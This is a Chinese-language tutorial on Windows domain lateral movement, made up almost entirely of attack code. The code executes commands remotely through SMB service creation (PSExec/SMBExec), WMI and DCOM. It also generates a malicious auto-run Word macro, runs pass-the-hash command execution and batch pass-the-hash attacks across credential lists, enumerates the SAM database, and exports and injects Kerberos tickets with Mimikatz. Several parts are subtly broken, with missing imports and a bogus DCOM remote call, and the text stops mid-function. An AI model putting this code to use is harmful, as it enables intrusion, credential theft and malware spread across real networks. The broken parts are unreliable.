# 域渗透与横向移动 - 横向移动技术

## 协议利用

### SMB横向移动

#### PSExec技术
```python
# psexec_lateral_movement.py
import smbprotocol
from smbprotocol.connection import Connection, Dialects
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect
from smbprotocol.open import Open, CreateOptions, FileAttributes, ShareAccess, ImpersonationLevel
import sys
import os
import base64

class PSExecLateralMovement:
    def __init__(self, target_ip, username, password, domain=""):
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.domain = domain
        self.connection = None
        self.session = None
    
    def connect_smb(self):
        """建立SMB连接"""
        try:
            self.connection = Connection(self.target_ip, self.target_ip)
            self.connection.connect(Dialects.SMB_3_0_2)
            
            self.session = Session(self.connection, self.username, self.password, self.domain)
            self.session.connect()
            
            print(f"[+] SMB connection established to {self.target_ip}")
            return True
            
        except Exception as e:
            print(f"[!] SMB connection failed: {e}")
            return False
    
    def upload_executable(self, local_path, remote_path="C:\\Windows\\System32\\svchosts.exe"):
        """上传可执行文件"""
        try:
            tree = TreeConnect(self.session, "C$")
            tree.connect()
            
            file_open = Open(tree, remote_path)
            file_open.create(
                ImpersonationLevel.Impersonation,
                FileAttributes.FILE_ATTRIBUTE_NORMAL,
                ShareAccess.FILE_SHARE_READ | ShareAccess.FILE_SHARE_WRITE,
                CreateOptions.FILE_NON_DIRECTORY_FILE | CreateOptions.FILE_SEQUENTIAL_ONLY
            )
            
            # 读取本地文件
            with open(local_path, 'rb') as f:
                file_data = f.read()
            
            # 写入远程文件
            file_open.write(file_data, 0)
            file_open.close()
            
            print(f"[+] Uploaded {local_path} to {remote_path}")
            return True
            
        except Exception as e:
            print(f"[!] File upload failed: {e}")
            return False
    
    def create_service(self, service_name="SecurityService", executable_path="C:\\Windows\\System32\\svchosts.exe"):
        """创建Windows服务"""
        try:
            # 使用SCM创建服务
            service_create_cmd = f"sc \\{self.target_ip} create {service_name} binPath= \"{executable_path}\" start= auto"
            
            result = subprocess.run(service_create_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] Service {service_name} created successfully")
                return True
            else:
                print(f"[!] Service creation failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"[!] Service creation error: {e}")
            return False
    
    def start_service(self, service_name="SecurityService"):
        """启动服务"""
        try:
            start_cmd = f"sc \\{self.target_ip} start {service_name}"
            result = subprocess.run(start_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] Service {service_name} started successfully")
                return True
            else:
                print(f"[!] Service start failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"[!] Service start error: {e}")
            return False
    
    def cleanup_service(self, service_name="SecurityService", executable_path="C:\\Windows\\System32\\svchosts.exe"):
        """清理服务"""
        try:
            # 停止服务
            stop_cmd = f"sc \\{self.target_ip} stop {service_name}"
            subprocess.run(stop_cmd, shell=True, capture_output=True)
            
            # 删除服务
            delete_cmd = f"sc \\{self.target_ip} delete {service_name}"
            subprocess.run(delete_cmd, shell=True, capture_output=True)
            
            # 删除可执行文件
            del_cmd = f"del \\{self.target_ip}\\{executable_path}"
            subprocess.run(del_cmd, shell=True, capture_output=True)
            
            print(f"[+] Cleanup completed")
            return True
            
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
            return False
    
    def execute_psexec(self, command, service_name="SecurityService"):
        """执行PSExec风格的横向移动"""
        # 创建恶意的可执行文件
        executable_content = f"""#include <windows.h>
#include <stdio.h>
int main() {{
    system("{command}");
    return 0;
}}"""
        
        # 编译可执行文件（需要编译器）
        local_exe = f"{service_name}.exe"
        with open(f"{service_name}.c", 'w') as f:
            f.write(executable_content)
        
        # 这里需要调用编译器编译C代码
        # compile_cmd = f"gcc -o {local_exe} {service_name}.c"
        # subprocess.run(compile_cmd, shell=True)
        
        # 上传文件
        remote_path = f"C:\\Windows\\System32\\{service_name}.exe"
        if self.upload_executable(local_exe, remote_path):
            # 创建并启动服务
            if self.create_service(service_name, remote_path) and self.start_service(service_name):
                print(f"[+] Command executed successfully via PSExec")
                
                # 清理
                self.cleanup_service(service_name, remote_path)
                return True
        
        return False
```

#### SMBExec实现
```python
# smbexec_lateral_movement.py
import impacket
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.scmr import DCERPCException
import time

class SMBExecLateralMovement:
    def __init__(self, target_ip, username, password, domain="", lmhash="", nthash=""):
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = lmhash
        self.nthash = nthash
        self.smb_connection = None
        self.rpc_transport = None
        self.dce = None
        self.service_name = "SecurityService"
        self.share_name = "C$"
    
    def connect_smb(self):
        """建立SMB连接"""
        try:
            self.smb_connection = SMBConnection(self.target_ip, self.target_ip)
            
            if self.lmhash and self.nthash:
                self.smb_connection.login(self.username, self.domain, self.lmhash, self.nthash)
            else:
                self.smb_connection.login(self.username, self.password, self.domain)
            
            print(f"[+] SMB connection established to {self.target_ip}")
            return True
            
        except Exception as e:
            print(f"[!] SMB connection failed: {e}")
            return False
    
    def connect_scmr(self):
        """连接服务控制管理器远程接口"""
        try:
            # 创建RPC传输
            rpctransport = transport.SMBTransport(
                self.target_ip, 
                445, 
                r'\pipe\svcctl', 
                username=self.username,
                password=self.password,
                domain=self.domain,
                lmhash=self.lmhash,
                nthash=self.nthash
            )
            
            self.dce = rpctransport.get_dce_rpc()
            self.dce.connect()
            
            # 绑定SCMR接口
            self.dce.bind(scmr.MSRPC_UUID_SCMR)
            
            # 打开SCM
            resp = scmr.hROpenSCManagerW(self.dce)
            self.scManagerHandle = resp['lpScHandle']
            
            print("[+] Connected to Service Control Manager")
            return True
            
        except Exception as e:
            print(f"[!] SCMR connection failed: {e}")
            return False
    
    def create_service(self, command):
        """创建服务"""
        try:
            # 创建服务
            resp = scmr.hRCreateServiceW(
                self.dce,
                self.scManagerHandle,
                self.service_name + "\\x00",
                self.service_name + "\\x00",
                lpBinaryPathName=command + "\\x00",
                dwStartType=scmr.SERVICE_DEMAND_START
            )
            
            self.serviceHandle = resp['lpServiceHandle']
            print(f"[+] Service {self.service_name} created")
            return True
            
        except DCERPCException as e:
            print(f"[!] Service creation failed: {e}")
            return False
    
    def start_service(self):
        """启动服务"""
        try:
            # 启动服务
            scmr.hRStartServiceW(self.dce, self.serviceHandle)
            print(f"[+] Service {self.service_name} started")
            return True
            
        except DCERPCException as e:
            print(f"[!] Service start failed: {e}")
            return False
    
    def delete_service(self):
        """删除服务"""
        try:
            # 停止服务
            try:
                scmr.hRControlService(self.dce, self.serviceHandle, scmr.SERVICE_CONTROL_STOP)
                time.sleep(2)
            except:
                pass
            
            # 删除服务
            scmr.hRDeleteService(self.dce, self.serviceHandle)
            print(f"[+] Service {self.service_name} deleted")
            return True
            
        except DCERPCException as e:
            print(f"[!] Service deletion failed: {e}")
            return False
    
    def cleanup(self):
        """清理资源"""
        try:
            if hasattr(self, 'serviceHandle') and self.serviceHandle:
                self.delete_service()
                scmr.hRCloseServiceHandle(self.dce, self.serviceHandle)
            
            if hasattr(self, 'scManagerHandle') and self.scManagerHandle:
                scmr.hRCloseServiceHandle(self.dce, self.scManagerHandle)
            
            if self.dce:
                self.dce.disconnect()
            
            print("[+] Cleanup completed")
            return True
            
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
            return False
    
    def execute_command(self, command):
        """执行命令"""
        # 构建完整的命令
        full_command = f"cmd.exe /c {command}"
        
        if self.connect_scmr():
            if self.create_service(full_command):
                if self.start_service():
                    print(f"[+] Command executed successfully: {command}")
                    
                    # 等待命令执行
                    time.sleep(5)
                    
                    self.cleanup()
                    return True
        
        self.cleanup()
        return False
```

### WMI横向移动

#### WMI命令执行
```powershell
# wmi_lateral_movement.ps1

# 基本WMI连接测试
$computer = "TARGET-PC"
$credential = Get-Credential

# 测试连接
test-wsman -computername $computer -credential $credential

# 获取远程进程列表
Get-WmiObject -Class Win32_Process -ComputerName $computer -Credential $credential | 
    Select-Object Name, ProcessId, CommandLine | 
    Sort-Object Name

# 创建远程进程
$process = Invoke-WmiMethod -Class Win32_Process -Name Create 
    -ArgumentList "cmd.exe /c whoami > C:\temp\result.txt" 
    -ComputerName $computer -Credential $credential

# 检查进程状态
if ($process.ReturnValue -eq 0) {
    Write-Host "[+] Process created successfully. PID: $($process.ProcessId)"
} else {
    Write-Host "[!] Process creation failed. Return value: $($process.ReturnValue)"
}

# 获取进程输出
Start-Sleep -Seconds 5
Get-Content "\\$computer\C$\temp\result.txt"
```

#### 高级WMI横向移动
```python
# wmi_advanced_lateral.py
import wmi
import win32com.client
import subprocess
import tempfile
import base64

class WMILateralMovement:
    def __init__(self, target_ip, username, password, domain=""):
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.domain = domain
        self.wmi_connection = None
    
    def connect_wmi(self):
        """建立WMI连接"""
        try:
            # 创建WMI连接
            locator = win32com.client.Dispatch("WbemScripting.SWbemLocator")
            
            wmi_path = f"\\\\{self.target_ip}\\root\\cimv2"
            
            if self.domain:
                full_username = f"{self.domain}\\{self.username}"
            else:
                full_username = self.username
            
            self.wmi_connection = locator.ConnectServer(
                self.target_ip,
                "root\\cimv2",
                full_username,
                self.password
            )
            
            print(f"[+] WMI connection established to {self.target_ip}")
            return True
            
        except Exception as e:
            print(f"[!] WMI connection failed: {e}")
            return False
    
    def execute_process(self, command, process_name="cmd.exe"):
        """执行远程进程"""
        try:
            # 获取Win32_Process类
            process_class = self.wmi_connection.Get("Win32_Process")
            
            # 创建进程
            result = process_class.Create(
                f"{process_name} /c {command}",
                "C:\\",  # 当前目录
                None    # 进程创建上下文
            )
            
            if result[0] == 0:
                print(f"[+] Process created successfully. PID: {result[1]}")
                return result[1]  # 返回进程ID
            else:
                print(f"[!] Process creation failed. Return code: {result[0]}")
                return None
                
        except Exception as e:
            print(f"[!] Process execution error: {e}")
            return None
    
    def upload_file(self, local_file, remote_file):
        """上传文件到远程系统"""
        try:
            # 读取本地文件
            with open(local_file, 'rb') as f:
                file_data = f.read()
            
            # 编码文件数据
            encoded_data = base64.b64encode(file_data).decode('utf-8')
            
            # 创建PowerShell命令来解码和写入文件
            ps_command = f"""
            $encodedData = '{encoded_data}'
            $decodedData = [System.Convert]::FromBase64String($encodedData)
            [System.IO.File]::WriteAllBytes('{remote_file}', $decodedData)
            """
            
            # 执行PowerShell命令
            result = self.execute_process(f"powershell.exe -Command \"{ps_command}\"")
            
            if result:
                print(f"[+] File uploaded successfully: {local_file} -> {remote_file}")
                return True
            else:
                print(f"[!] File upload failed")
                return False
                
        except Exception as e:
            print(f"[!] File upload error: {e}")
            return False
    
    def create_scheduled_task(self, task_name, command, schedule="ONCE"):
        """创建计划任务"""
        try:
            # 获取计划任务服务
            scheduler = self.wmi_connection.Get("Win32_ScheduledJob")
            
            # 创建计划任务
            result = scheduler.Create(
                f"{command}",
                datetime.now().strftime("%Y%m%d%H%M%S.000000+000"),  # 立即执行
                True,  # 运行一次
                0,     # 无重复
                0,     # 无重复间隔
                False  # 不交互
            )
            
            if result[0] == 0:
                print(f"[+] Scheduled task created successfully. Job ID: {result[1]}")
                return result[1]
            else:
                print(f"[!] Scheduled task creation failed. Return code: {result[0]}")
                return None
                
        except Exception as e:
            print(f"[!] Scheduled task creation error: {e}")
            return None
    
    def get_system_info(self):
        """获取系统信息"""
        try:
            # 获取操作系统信息
            os_info = self.wmi_connection.ExecQuery("SELECT * FROM Win32_OperatingSystem")
            
            system_data = {}
            for os in os_info:
                system_data['os'] = {
                    'caption': os.Caption,
                    'version': os.Version,
                    'architecture': os.OSArchitecture,
                    'install_date': os.InstallDate
                }
            
            # 获取计算机系统信息
            cs_info = self.wmi_connection.ExecQuery("SELECT * FROM Win32_ComputerSystem")
            
            for cs in cs_info:
                system_data['computer'] = {
                    'name': cs.Name,
                    'domain': cs.Domain,
                    'username': cs.UserName,
                    'total_physical_memory': cs.TotalPhysicalMemory
                }
            
            return system_data
            
        except Exception as e:
            print(f"[!] System info retrieval error: {e}")
            return {}
    
    def escalate_privileges(self):
        """尝试权限提升"""
        try:
            # 检查当前进程令牌
            process_info = self.wmi_connection.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId = 0")
            
            for process in process_info:
                print(f"[+] Current process: {process.Name}")
                print(f"[+] Process owner: {process.GetOwner()}")
            
            # 尝试创建高权限进程
            result = self.execute_process("whoami /groups", "cmd.exe")
            
            return result is not None
            
        except Exception as e:
            print(f"[!] Privilege escalation error: {e}")
            return False
    
    def lateral_movement_pipeline(self, payload_url, target_files):
        """完整的横向移动流程"""
        print(f"[*] Starting lateral movement to {self.target_ip}")
        
        if not self.connect_wmi():
            return False
        
        # 1. 获取系统信息
        system_info = self.get_system_info()
        print(f"[+] System info: {json.dumps(system_info, indent=2)}")
        
        # 2. 上传payload
        remote_payload = "C:\\Windows\\Temp\\payload.exe"
        if not self.upload_file("payload.exe", remote_payload):
            print("[!] Failed to upload payload")
            return False
        
        # 3. 创建计划任务执行payload
        task_name = "SecurityUpdate"
        task_id = self.create_scheduled_task(task_name, remote_payload)
        
        if task_id:
            print(f"[+] Payload scheduled for execution (Job ID: {task_id})")
        else:
            # 直接执行payload
            pid = self.execute_process(remote_payload)
            if pid:
                print(f"[+] Payload executed (PID: {pid})")
            else:
                print("[!] Failed to execute payload")
                return False
        
        # 4. 清理（延迟执行）
        # 这里可以添加清理逻辑
        
        print("[+] Lateral movement completed successfully")
        return True
```

### DCOM横向移动

#### DCOM技术实现
```python
# dcom_lateral_movement.py
import pythoncom
import win32com.client
import win32api
import win32con
from win32com.client import Dispatch
import os
import tempfile

class DCOMLateralMovement:
    def __init__(self, target_ip, username, password, domain=""):
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.domain = domain
        self.dcom_objects = [
            "MMC20.Application",
            "ShellWindows",
            "ShellBrowserWindow",
            "Excel.Application",
            "Word.Application",
            "Outlook.Application",
            "PowerPoint.Application",
            "Access.Application",
            "Visio.Application",
            "MSProject.Application"
        ]
    
    def create_dcom_connection(self, prog_id):
        """创建DCOM连接"""
        try:
            # 设置COM安全级别
            pythoncom.CoInitializeSecurity(
                None,
                None,
                None,
                pythoncom.RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                pythoncom.RPC_C_IMP_LEVEL_IMPERSONATE,
                None,
                pythoncom.EOAC_NONE,
                None
            )
            
            # 创建远程COM对象
            dcom_object = win32com.client.Dispatch(prog_id)
            
            # 设置远程服务器
            if hasattr(dcom_object, '_oleobj_'):
                dcom_object._oleobj_.Invoke(
                    0,  # DISPID_VALUE
                    0,
                    pythoncom.DISPATCH_PROPERTYPUT,
                    True,  # 远程执行标志
                    (self.target_ip,)
                )
            
            print(f"[+] DCOM connection established: {prog_id}")
            return dcom_object
            
        except Exception as e:
            print(f"[!] DCOM connection failed for {prog_id}: {e}")
            return None
    
    def execute_via_mmc20(self, command):
        """通过MMC20.Application执行命令"""
        try:
            # 创建MMC20.Application对象
            mmc = self.create_dcom_connection("MMC20.Application")
            if not mmc:
                return False
            
            # 获取Document对象
            doc = mmc.Document
            
            # 创建控制台根节点
            root_node = doc.RootNode
            
            # 添加新任务
            task = root_node.AddNewTask()
            
            # 设置任务命令
            task.Command = command
            task.Run()
            
            print(f"[+] Command executed via MMC20: {command}")
            return True
            
        except Exception as e:
            print(f"[!] MMC20 execution error: {e}")
            return False
    
    def execute_via_shellwindows(self, command):
        """通过ShellWindows执行命令"""
        try:
            # 创建ShellWindows对象
            shell = self.create_dcom_connection("ShellWindows")
            if not shell:
                return False
            
            # 获取第一个窗口
            if shell.Count > 0:
                window = shell.Item(0)
                
                # 通过窗口执行命令
                window.Document.Application.ShellExecute(
                    "cmd.exe",
                    f"/c {command}",
                    "",
                    "",
                    0  # SW_HIDE
                )
                
                print(f"[+] Command executed via ShellWindows: {command}")
                return True
            else:
                print("[!] No ShellWindows found")
                return False
                
        except Exception as e:
            print(f"[!] ShellWindows execution error: {e}")
            return False
    
    def execute_via_excel(self, command):
        """通过Excel.Application执行命令"""
        try:
            # 创建Excel.Application对象
            excel = self.create_dcom_connection("Excel.Application")
            if not excel:
                return False
            
            # 创建新的工作簿
            workbook = excel.Workbooks.Add()
            
            # 使用VBA执行命令
            vba_code = f"""
            Sub ExecuteCommand()
                Shell "{command}", vbHide
            End Sub
            """
            
            # 添加VBA模块
            vb_module = workbook.VBProject.VBComponents.Add(1)  # vbext_ct_StdModule
            vb_module.CodeModule.AddFromString(vba_code)
            
            # 执行VBA代码
            excel.Application.Run("ExecuteCommand")
            
            # 关闭工作簿
            workbook.Close(False)
            excel.Quit()
            
            print(f"[+] Command executed via Excel: {command}")
            return True
            
        except Exception as e:
            print(f"[!] Excel execution error: {e}")
            return False
    
    def execute_via_outlook(self, command):
        """通过Outlook.Application执行命令"""
        try:
            # 创建Outlook.Application对象
            outlook = self.create_dcom_connection("Outlook.Application")
            if not outlook:
                return False
            
            # 创建新的邮件
            mail = outlook.CreateItem(0)  # olMailItem
            
            # 使用邮件规则执行命令
            # 这里使用Windows Script Host
            wsh = outlook.Application.CreateObject("WScript.Shell")
            wsh.Run(command, 0, False)
            
            print(f"[+] Command executed via Outlook: {command}")
            return True
            
        except Exception as e:
            print(f"[!] Outlook execution error: {e}")
            return False
    
    def test_all_dcom_objects(self, command):
        """测试所有DCOM对象"""
        print(f"[*] Testing DCOM objects for command execution...")
        
        successful_objects = []
        
        for prog_id in self.dcom_objects:
            print(f"[*] Testing {prog_id}...")
            
            # 尝试不同的执行方法
            if prog_id == "MMC20.Application":
                if self.execute_via_mmc20(command):
                    successful_objects.append(prog_id)
            elif prog_id == "ShellWindows":
                if self.execute_via_shellwindows(command):
                    successful_objects.append(prog_id)
            elif prog_id in ["Excel.Application", "Word.Application", "PowerPoint.Application"]:
                if self.execute_via_excel(command):
                    successful_objects.append(prog_id)
            elif prog_id == "Outlook.Application":
                if self.execute_via_outlook(command):
                    successful_objects.append(prog_id)
            
            # 可以添加更多DCOM对象的特定利用方法
        
        print(f"[+] Successful DCOM objects: {successful_objects}")
        return successful_objects
    
    def create_dcom_payload(self, payload_command):
        """创建DCOM payload"""
        # 创建恶意的Office文档
        try:
            # 创建Word文档
            word = win32com.client.Dispatch("Word.Application")
            doc = word.Documents.Add()
            
            # 添加VBA宏
            vba_code = f"""
            Sub AutoOpen()
                Shell "{payload_command}", vbHide
            End Sub
            
            Sub Document_Open()
                Shell "{payload_command}", vbHide
            End Sub
            """
            
            # 添加VBA模块
            vb_module = doc.VBProject.VBComponents.Add(1)  # vbext_ct_StdModule
            vb_module.CodeModule.AddFromString(vba_code)
            
            # 保存文档
            payload_path = os.path.join(tempfile.gettempdir(), "document.docm")
            doc.SaveAs(payload_path, 13)  # wdFormatXMLDocumentMacroEnabled
            doc.Close(False)
            word.Quit()
            
            print(f"[+] DCOM payload created: {payload_path}")
            return payload_path
            
        except Exception as e:
            print(f"[!] DCOM payload creation error: {e}")
            return None
    
    def auto_dcom_exploitation(self, command):
        """自动DCOM利用"""
        print(f"[*] Starting automatic DCOM exploitation...")
        
        # 测试所有DCOM对象
        successful_objects = self.test_all_dcom_objects(command)
        
        if successful_objects:
            print(f"[+] DCOM exploitation successful using: {successful_objects}")
            return True
        else:
            print("[!] No DCOM objects were successfully exploited")
            
            # 尝试创建payload
            payload_path = self.create_dcom_payload(command)
            if payload_path:
                print(f"[*] Created DCOM payload at {payload_path}")
                print(f"[*] Payload can be distributed and executed via DCOM")
                return True
        
        return False
```

---

## 哈希传递与票据传递

### Pass-the-Hash

#### NTLM哈希传递
```python
# pass_the_hash.py
import hashlib
import hmac
import struct
import socket
from impacket.ntlm import NTLMAuthNegotiate, NTLMAuthChallenge, NTLMAuthChallengeResponse
from impacket.smbconnection import SMBConnection

class PassTheHash:
    def __init__(self, target_ip, username, nthash, domain=""):
        self.target_ip = target_ip
        self.username = username
        self.nthash = nthash
        self.domain = domain
        self.smb_connection = None
    
    def connect_with_hash(self):
        """使用NTLM哈希进行身份验证"""
        try:
            # 创建SMB连接
            self.smb_connection = SMBConnection(self.target_ip, self.target_ip)
            
            # 使用哈希进行身份验证
            lmhash = ""
            self.smb_connection.login(
                self.username,
                "",  # 空密码
                self.domain,
                lmhash,
                self.nthash
            )
            
            print(f"[+] Pass-the-Hash successful for {self.username}@{self.domain}")
            return True
            
        except Exception as e:
            print(f"[!] Pass-the-Hash failed: {e}")
            return False
    
    def execute_command_with_hash(self, command):
        """使用哈希执行命令"""
        if not self.connect_with_hash():
            return False
        
        try:
            # 创建服务来执行命令
            from impacket.dcerpc.v5 import scmr
            from impacket.dcerpc.v5.transport import SMBTransport
            
            # 创建RPC传输
            rpctransport = SMBTransport(
                self.target_ip,
                445,
                r'\pipe\svcctl',
                username=self.username,
                password="",
                domain=self.domain,
                lmhash="",
                nthash=self.nthash
            )
            
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)
            
            # 打开SCM
            resp = scmr.hROpenSCManagerW(dce)
            scManagerHandle = resp['lpScHandle']
            
            # 创建服务
            service_name = "PTHService"
            resp = scmr.hRCreateServiceW(
                dce,
                scManagerHandle,
                service_name + "\\x00",
                service_name + "\\x00",
                lpBinaryPathName=f"cmd.exe /c {command}\\x00",
                dwStartType=scmr.SERVICE_DEMAND_START
            )
            serviceHandle = resp['lpServiceHandle']
            
            # 启动服务
            scmr.hRStartServiceW(dce, serviceHandle)
            print(f"[+] Command executed: {command}")
            
            # 清理
            scmr.hRDeleteService(dce, serviceHandle)
            scmr.hRCloseServiceHandle(dce, serviceHandle)
            scmr.hRCloseServiceHandle(dce, scManagerHandle)
            dce.disconnect()
            
            return True
            
        except Exception as e:
            print(f"[!] Command execution error: {e}")
            return False
    
    def dump_sam_with_hash(self):
        """使用哈希转储SAM数据库"""
        if not self.connect_with_hash():
            return False
        
        try:
            # 使用reg命令转储SAM
            from impacket.dcerpc.v5 import rrp
            from impacket.dcerpc.v5.transport import SMBTransport
            
            rpctransport = SMBTransport(
                self.target_ip,
                445,
                r'\pipe\winreg',
                username=self.username,
                password="",
                domain=self.domain,
                lmhash="",
                nthash=self.nthash
            )
            
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(rrp.MSRPC_UUID_RRP)
            
            # 打开注册表
            resp = rrp.hOpenLocalMachine(dce)
            hRootKey = resp['phKey']
            
            # 打开SAM键
            resp = rrp.hBaseRegOpenKey(dce, hRootKey, "SAM\\SAM\\Domains\\Account\\Users")
            hSamKey = resp['phkResult']
            
            # 枚举用户
            users = []
            index = 0
            while True:
                try:
                    resp = rrp.hBaseRegEnumKey(dce, hSamKey, index)
                    user_rid = resp['lpNameOut']
                    users.append(user_rid)
                    index += 1
                except:
                    break
            
            print(f"[+] Found {len(users)} users in SAM database")
            
            # 清理
            rrp.hBaseRegCloseKey(dce, hSamKey)
            rrp.hBaseRegCloseKey(dce, hRootKey)
            dce.disconnect()
            
            return users
            
        except Exception as e:
            print(f"[!] SAM dump error: {e}")
            return []
```

#### 批量PTH攻击
```python
# batch_pth_attack.py
import concurrent.futures
import json
from pass_the_hash import PassTheHash

class BatchPTHAttack:
    def __init__(self, max_workers=10):
        self.max_workers = max_workers
        self.results = []
    
    def load_targets(self, targets_file):
        """加载目标列表"""
        with open(targets_file, 'r') as f:
            targets = json.load(f)
        return targets
    
    def load_credentials(self, credentials_file):
        """加载凭证列表"""
        with open(credentials_file, 'r') as f:
            credentials = json.load(f)
        return credentials
    
    def pth_attack_single(self, target, credential):
        """对单个目标执行PTH攻击"""
        try:
            pth = PassTheHash(
                target['ip'],
                credential['username'],
                credential['nthash'],
                credential.get('domain', '')
            )
            
            # 尝试连接
            if pth.connect_with_hash():
                result = {
                    'target': target,
                    'credential': credential,
                    'success': True,
                    'timestamp': datetime.now().isoformat()
                }
                
                # 尝试执行命令
                if target.get('command'):
                    if pth.execute_command_with_hash(target['command']):
                        result['command_executed'] = True
                    else:
                        result['command_executed'] = False
                
                return result
            else:
                return {
                    'target': target,
                    'credential': credential,
                    'success': False,
                    'timestamp': datetime.now().isoformat()
                }
                
        except Exception as e:
            return {
                'target': target,
                'credential': credential,
                'success': False,
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
    
    def batch_pth_attack(self, targets, credentials):
        """批量PTH攻击"""
        print(f"[*] Starting batch PTH attack on {len(targets)} targets with {len(credentials)} credentials")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # 为每个目标-凭证组合创建任务
            futures = []
            for target in targets:
                for credential in credentials:
                    future = executor.submit(self.pth_attack_single, target, credential)
                    futures.append(future)
            
            # 收集结果
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                self.results.append(result)
                
                if result['success']:
                    print(f"[+] PTH successful: {result['target']['ip']} with {result['credential']['username']}")
                else:
                    print(f"[-] PTH failed: {result['target']['ip']} with {result['credential']['username']}")
        
        return self.results
    
    def generate_attack_report(self):
        """生成攻击报告"""
        successful_attacks = [r for r in self.results if r['success']]
        failed_attacks = [r for r in self.results if not r['success']]
        
        report = {
            'total_attempts': len(self.results),
            'successful_attacks': len(successful_attacks),
            'failed_attacks': len(failed_attacks),
            'success_rate': len(successful_attacks) / len(self.results) * 100 if self.results else 0,
            'successful_credentials': {},
            'failed_targets': []
        }
        
        # 统计成功的凭证
        for attack in successful_attacks:
            cred_key = f"{attack['credential']['username']}:{attack['credential']['nthash']}"
            if cred_key not in report['successful_credentials']:
                report['successful_credentials'][cred_key] = []
            report['successful_credentials'][cred_key].append(attack['target']['ip'])
        
        # 统计失败的目标
        for attack in failed_attacks:
            target_key = attack['target']['ip']
            if target_key not in report['failed_targets']:
                report['failed_targets'].append(target_key)
        
        return report
    
    def save_results(self, output_file):
        """保存结果"""
        with open(output_file, 'w') as f:
            json.dump({
                'results': self.results,
                'report': self.generate_attack_report()
            }, f, indent=2, default=str)
        
        print(f"[+] Results saved to {output_file}")

# 使用示例
batch_pth = BatchPTHAttack(max_workers=5)

# 加载目标和凭证
targets = batch_pth.load_targets('targets.json')
credentials = batch_pth.load_credentials('credentials.json')

# 执行批量攻击
results = batch_pth.batch_pth_attack(targets, credentials)

# 保存结果
batch_pth.save_results('pth_attack_results.json')
```

### Pass-the-Ticket

#### Kerberos票据传递
```python
# pass_the_ticket.py
import os
import subprocess
import tempfile
from datetime import datetime

class PassTheTicket:
    def __init__(self):
        self.tickets = []
        self.current_ticket = None
    
    def load_ticket_from_file(self, ticket_file):
        """从文件加载Kerberos票据"""
        try:
            with open(ticket_file, 'rb') as f:
                ticket_data = f.read()
            
            # 这里可以添加票据解析逻辑
            ticket_info = {
                'file_path': ticket_file,
                'data': ticket_data,
                'loaded_at': datetime.now().isoformat()
            }
            
            self.tickets.append(ticket_info)
            print(f"[+] Ticket loaded from {ticket_file}")
            return ticket_info
            
        except Exception as e:
            print(f"[!] Error loading ticket from {ticket_file}: {e}")
            return None
    
    def extract_ticket_from_memory(self):
        """从内存中提取Kerberos票据"""
        try:
            # 使用Mimikatz提取票据
            mimikatz_script = """
            privilege::debug
            sekurlsa::tickets /export
            exit
            """
            
            # 执行Mimikatz
            script_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
            script_file.write(mimikatz_script)
            script_file.close()
            
            # 这里需要调用Mimikatz
            # result = subprocess.run(['mimikatz.exe', '/script', script_file.name], 
            #                        capture_output=True, text=True)
            
            # 清理
            os.unlink(script_file.name)
            
            # 查找提取的KIRBI文件
            kirbi_files = []
            for file in os.listdir('.'):
                if file.endswith('.kirbi'):
                    kirbi_files.append(file)
            
            print(f"[+] Extracted {len(kirbi_files)} tickets from memory")
            return kirbi_files
            
        except Exception as e:
            print(f"[!] Error extracting tickets from memory: {e}")
            return []
    
    def inject_ticket(self, ticket_file):
        """注入Kerberos票据"""
        try:
            # 使用Mimikatz注入票据
            mimikatz_script = f"""
            privilege::debug
            kerberos::ptt {ticket_file}
            exit
            """
            
            script_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
            script_file.write(mimikatz_script)
            script_file.close()
            
            # 执行Mimikatz
            # result = subprocess.run(['mimikatz.exe', '/script', script_file.name], 
            #                        capture_output=True, text=True)
            
            # 清理
            os.unlink(script_file.name)
            
            self.current_ticket = ticket_file
            print(f"[+] Ticket injected: {ticket_file}")
            return True
            
        except Exception as e:
            print(f"[!] Error injecting ticket {ticket_file}: {e}")
            return False
    
    def verify_ticket_injection(self):
        """验证票据注入"""
        try:
            # 使用klist验证票据
            result = subprocess.run(['klist'], capture_output=True, text=True)
            
            if result.returncode == 0:
                print("[+] Current Kerberos tickets:")
                print(result.stdout)
                return True
            else:
                print("[!] No Kerberos tickets found or klist failed")
                return False
                
        except FileNotFoundError:
            print("[!] klist command not found")
            return False
    
    def use_ticket_for_access(self, target_service, target_ip):
        """使用票据访问目标服务"""
        try:
            if not self.current_ticket:
                print("[!] No ticket currently injected")
                return False
            
            print(f"[*] Using ticket {self.current_ticket} to access {target_service} on {target_ip}")
            
            # 这里可以添加具体的访问逻辑
            # 例如：使用SMB、RDP、HTTP等协议访问
            
            if target_service.lower() == "smb":
                return self.access_smb_with_ticket(target_ip)
            elif target_service.lower() == "rdp":
                return self.access_rdp_with_ticket(target_ip)
            else:
                print(f"[!] Unsupported service: {target_service}")
                return False
                
        except Exception as e:
            print(f"[!] Error using ticket for {target_service}: {e}")
            return False
    
    def access_smb_with_ticket(self, target_ip):
        """使用票据访问SMB"""
        try:
            # 这里可以使用impacket或其他库
            # 使用当前的Kerberos票据进行SMB连接
            
            print(f"[+] Attempting SMB connection to {target_ip} with current ticket")
            
            # 验证连接
            result = subprocess.run(['smbclient', '-L', target_ip, '-k'], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
